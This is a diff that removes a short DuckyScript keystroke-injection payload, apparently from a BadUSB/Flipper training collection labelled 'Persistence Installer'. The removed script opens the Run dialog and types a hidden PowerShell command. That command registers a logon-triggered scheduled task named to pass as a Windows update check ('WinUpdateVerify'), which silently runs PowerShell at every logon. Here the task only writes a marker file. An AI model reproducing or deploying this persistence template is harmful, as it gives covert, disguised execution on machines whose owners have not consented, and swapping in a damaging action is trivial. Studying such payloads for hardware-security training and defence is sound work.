@@ -1,7 +1,0 @@
-REM CYBERFLIPPER - INTERMEDIATE Level
-REM Persistence Installer - Creates a scheduled task callback
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -W Hidden -C "$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-W Hidden -C echo CYBER_PERSIST > $env:TEMP\p.txt';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'WinUpdateVerify' -Action $a -Trigger $t -Force"
-ENTER
